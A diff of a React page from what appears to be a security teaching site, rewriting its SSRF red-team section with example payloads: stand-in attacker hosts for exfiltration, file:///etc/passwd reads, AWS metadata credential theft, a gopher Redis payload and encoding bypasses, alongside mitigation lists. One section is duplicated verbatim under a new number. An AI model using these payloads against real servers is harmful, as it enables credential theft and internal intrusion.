@@ -21,99 +21,320 @@ export default function SSRFPage() {
         </div>
       </section>
 
+
+
+
+
+
       <section className="mb-10">
         <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>
 
+
+
+
+
+
         <article className="mb-6 bg-gray-900 p-4 rounded-lg">
-          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic SSRF Attacks</h3>
-          
-          <h4 className="font-medium mb-1 mt-3">URL Fetching</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
+          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic SSRF (Server-Side Request Forgery)</h3>
+          <p className="mb-3">
+            Server-Side Request Forgery (SSRF) occurs when an attacker can make a vulnerable server send HTTP requests to arbitrary internal or external resources. This can lead to data leakage, internal service access, and even remote code execution in some configurations.
+          </p>
+
+          <div className="space-y-4">
+            <div>
+              <h4 className="font-medium mb-1">Basic External Request</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
 {`http://vulnerable.com/api/fetch?url=http://attacker.com`}
-          </pre>
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">Attacker forces the backend to make a request to a domain they control, potentially exfiltrating data.</p>
+            </div>
 
-          <h4 className="font-medium mb-1 mt-3">File Protocol</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
+            <div>
+              <h4 className="font-medium mb-1">File Protocol (Local File Access)</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
 {`http://vulnerable.com/export?template=file:///etc/passwd`}
-          </pre>
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">Reads sensitive files from the local filesystem if not properly restricted.</p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Internal Service Discovery</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://127.0.0.1:8000/admin`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">Used to probe internal-only services such as cloud metadata endpoints, admin panels, or Redis instances.</p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Cloud Metadata Exploitation (AWS)</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">Attempts to access AWS EC2 metadata service to steal instance credentials.</p>
+            </div>
+
+            <div className="p-3 bg-red-900/30 rounded">
+              <h4 className="font-medium mb-1">Common SSRF Targets:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1">
+                <li><strong>Cloud metadata services:</strong> AWS, GCP, Azure metadata endpoints</li>
+                <li><strong>Internal services:</strong> Admin panels, databases, Redis, MongoDB, etc.</li>
+                <li><strong>Localhost services:</strong> <code>127.0.0.1</code>, <code>localhost</code>, <code>0.0.0.0</code>, etc.</li>
+                <li><strong>File protocols:</strong> <code>file://</code>, <code>dict://</code>, <code>gopher://</code></li>
+              </ul>
+            </div>
+
+          </div>
         </article>
+
+
+
+
 
         <article className="mb-6 bg-gray-900 p-4 rounded-lg">
-          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Cloud Metadata Exploitation</h3>
-          
-          <h4 className="font-medium mb-1 mt-3">AWS IMDSv1</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/`}
-          </pre>
+          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Blind SSRF</h3>
+          <p className="mb-3">
+            Blind Server-Side Request Forgery (Blind SSRF) occurs when the server performs a request, but the response is not directly visible to the attacker. Exploitation requires side-channel feedback, such as DNS callbacks or external logs. It's often used to exfiltrate data, scan internal networks, or trigger actions on internal services.
+          </p>
 
-          <h4 className="font-medium mb-1 mt-3">Azure Metadata</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`http://169.254.169.254/metadata/instance?api-version=2021-02-01`}
-          </pre>
+          <div className="space-y-4">
+            <div>
+              <h4 className="font-medium mb-1">DNS-Based Exfiltration</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/fetch?url=http://abc.attacker-server.com`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Attacker monitors DNS logs for <code>abc.attacker-server.com</code> to confirm server-side request execution.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">AWS Metadata Fetch (No Direct Output)</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                If the server doesn’t return the response but internally logs it or stores it somewhere retrievable later, credentials may still be exposed.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Trigger via Gopher Protocol (Redis RCE)</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`gopher://127.0.0.1:6379/_%2A1%0D%0ASET%0D%0Aevil%0D%0A"payload"`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Sends raw payloads to internal services like Redis or Memcached — no output returned but action is performed.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Out-of-Band Detection Using Collaborator</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://target.com/render?url=http://burpcollaborator.net/abc123`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Uses platforms like <code>Burp Collaborator</code> or <code>Canarytokens</code> to receive pingback or DNS resolution.
+              </p>
+            </div>
+
+            <div className="p-3 bg-red-900/30 rounded">
+              <h4 className="font-medium mb-1">Common Feedback Channels for Blind SSRF:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1">
+                <li>DNS logs from controlled domain</li>
+                <li>Server logs or cache entries</li>
+                <li>Out-of-band services (Burp Collaborator, Interact.sh)</li>
+                <li>Email/Slack/webhook notifications triggered by SSRF action</li>
+              </ul>
+            </div>
+
+          </div>
         </article>
+
+
+
 
         <article className="mb-6 bg-gray-900 p-4 rounded-lg">
-          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Advanced Bypass Techniques</h3>
-          
-          <h4 className="font-medium mb-1 mt-3">DNS Rebinding</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`http://7f000001.0x7f.1 (127.0.0.1)
-http://localtest.me (resolves to 127.0.0.1)`}
-          </pre>
+          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Authenticated SSRF</h3>
+          <p className="mb-3">
+            Authenticated SSRF vulnerabilities require the attacker to be logged in or have valid credentials. The attacker abuses functionality available only to authenticated users to trigger server-side requests, often targeting internal services or sensitive endpoints accessible within the trusted network.
+          </p>
 
-          <h4 className="font-medium mb-1 mt-3">URL Obfuscation</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`http://127.0.0.1:80@evil.com
-http://0177.0.0.1 (Octal encoding)
-http://0x7f.0x0.0x0.0x1 (Hex encoding)
-http://①②⑦.⓪.⓪.① (Unicode)`}
-          </pre>
+          <div className="space-y-4">
+            <div>
+              <h4 className="font-medium mb-1">Example: Fetch Internal Admin Panel</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`POST /user/settings/fetch HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/json
+Cookie: session=valid_user_session_token
+
+{
+  "url": "http://127.0.0.1:8080/admin"
+}`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Authenticated attacker leverages a feature that fetches URLs, causing the server to access an internal admin interface not accessible externally.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Example: Cloud Metadata Access via Authenticated Request</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`GET /profile?avatar=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: vulnerable.com
+Cookie: session=valid_user_session_token`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Logged-in users’ requests are abused to retrieve sensitive cloud credentials through SSRF.
+              </p>
+            </div>
+
+            <div className="p-3 bg-red-900/30 rounded">
+              <h4 className="font-medium mb-1">Why Authenticated SSRF Is Dangerous:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1">
+                <li>Allows attackers to leverage user privileges inside the application</li>
+                <li>Enables access to otherwise protected internal systems</li>
+                <li>May lead to privilege escalation if sensitive internal endpoints are exposed</li>
+                <li>Harder to detect since traffic looks like legitimate authenticated activity</li>
+              </ul>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Mitigation Techniques:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1 text-sm text-gray-400">
+                <li>Implement strict input validation and URL allowlisting</li>
+                <li>Restrict sensitive internal endpoints from being accessed via SSRF vectors</li>
+                <li>Limit functionality that allows fetching URLs to trusted sources only</li>
+                <li>Use network segmentation to separate internal resources</li>
+                <li>Monitor authenticated user actions for unusual SSRF attempts</li>
+              </ul>
+            </div>
+          </div>
         </article>
+
+
+
+
+
 
         <article className="mb-6 bg-gray-900 p-4 rounded-lg">
-          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Protocol Smuggling</h3>
-          
-          <h4 className="font-medium mb-1 mt-3">Gopher Protocol</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aPING%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a`}
-          </pre>
+          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Recursive SSRF</h3>
+          <p className="mb-3">
+            Recursive SSRF occurs when a server-side request triggered by SSRF leads to another internal request, creating a chain or loop of requests. This can be exploited to scan internal networks, amplify attacks, or reach deeply nested internal resources that are not directly accessible.
+          </p>
 
-          <h4 className="font-medium mb-1 mt-3">SSRF to RCE</h4>
-          <pre className="bg-gray-700 p-3 rounded overflow-auto">
-{`http://internal-admin-panel.local/run?cmd=id
-http://127.0.0.1:8080/actuator/gateway/routes/new`}
-          </pre>
+          <div className="space-y-4">
+            <div>
+              <h4 className="font-medium mb-1">Example: SSRF Triggering Internal Redirect</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://internal-service.local/redirect?target=http://127.0.0.1/admin`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                The initial SSRF request triggers a redirect that causes the server to make an additional request to another internal URL.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Example: Chained SSRF to Scan Network</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://10.0.0.5:8080/scan?next=10.0.0.6`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                A crafted SSRF request triggers the server to scan a network range recursively by chaining internal requests through vulnerable endpoints.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Amplification via Recursive Requests</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://internal-service.local/fetch?url=http://another-service.local/admin`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Recursive SSRF can cause multiple internal requests cascading from one initial attacker-controlled input.
+              </p>
+            </div>
+
+            <div className="p-3 bg-red-900/30 rounded">
+              <h4 className="font-medium mb-1">Risks of Recursive SSRF:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1">
+                <li>Internal network discovery and enumeration</li>
+                <li>Amplified attack surface increasing the chance of sensitive data exposure</li>
+                <li>Potential for Denial-of-Service by exhausting server resources</li>
+                <li>Harder to detect due to multi-step indirect requests</li>
+              </ul>
+            </div>
+
+          </div>
         </article>
+
+
 
         <article className="mb-6 bg-gray-900 p-4 rounded-lg">
-          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Tools & Payloads</h3>
-          
-          <h4 className="font-medium mb-1 mt-3">Detection Tools</h4>
-          <ul className="list-disc list-inside ml-4 space-y-1">
-            <li>Burp Collaborator</li>
-            <li>Interactsh</li>
-            <li>SSRF Sheriff</li>
-            <li>OOB Testing Tools</li>
-          </ul>
+          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Recursive SSRF</h3>
+          <p className="mb-3">
+            Recursive SSRF occurs when a server-side request triggered by SSRF leads to another internal request, creating a chain or loop of requests. This can be exploited to scan internal networks, amplify attacks, or reach deeply nested internal resources that are not directly accessible.
+          </p>
 
-          <h4 className="font-medium mb-1 mt-3">Exploitation Tools</h4>
-          <ul className="list-disc list-inside ml-4 space-y-1">
-            <li>SSRFmap</li>
-            <li>Gopherus</li>
-            <li>CloudScraper</li>
-            <li>Metabadger (AWS protection bypass)</li>
-          </ul>
+          <div className="space-y-4">
+            <div>
+              <h4 className="font-medium mb-1">Example: SSRF Triggering Internal Redirect</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://internal-service.local/redirect?target=http://127.0.0.1/admin`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                The initial SSRF request triggers a redirect that causes the server to make an additional request to another internal URL.
+              </p>
+            </div>
 
-          <h4 className="font-medium mb-1 mt-3">Payload Lists</h4>
-          <ul className="list-disc list-inside ml-4 space-y-1">
-            <li>Cloud metadata endpoints</li>
-            <li>Internal service URLs</li>
-            <li>DNS rebinding domains</li>
-            <li>Alternative IP encodings</li>
-          </ul>
+            <div>
+              <h4 className="font-medium mb-1">Example: Chained SSRF to Scan Network</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://10.0.0.5:8080/scan?next=10.0.0.6`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                A crafted SSRF request triggers the server to scan a network range recursively by chaining internal requests through vulnerable endpoints.
+              </p>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Amplification via Recursive Requests</h4>
+              <pre className="bg-gray-700 p-3 rounded overflow-auto">
+{`http://vulnerable.com/api/fetch?url=http://internal-service.local/fetch?url=http://another-service.local/admin`}
+              </pre>
+              <p className="text-sm text-gray-400 mt-1">
+                Recursive SSRF can cause multiple internal requests cascading from one initial attacker-controlled input.
+              </p>
+            </div>
+
+            <div className="p-3 bg-red-900/30 rounded">
+              <h4 className="font-medium mb-1">Risks of Recursive SSRF:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1">
+                <li>Internal network discovery and enumeration</li>
+                <li>Amplified attack surface increasing the chance of sensitive data exposure</li>
+                <li>Potential for Denial-of-Service by exhausting server resources</li>
+                <li>Harder to detect due to multi-step indirect requests</li>
+              </ul>
+            </div>
+
+            <div>
+              <h4 className="font-medium mb-1">Mitigation Strategies:</h4>
+              <ul className="list-disc list-inside ml-4 space-y-1 text-sm text-gray-400">
+                <li>Implement strict request validation and allowlisting</li>
+                <li>Limit or block redirects and chained requests within internal services</li>
+                <li>Monitor and rate-limit outbound server requests</li>
+                <li>Use network segmentation to minimize accessible internal endpoints</li>
+              </ul>
+            </div>
+          </div>
         </article>
+
+
       </section>
+
+
+
+
+
 
       <section className="mb-10">
         <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>
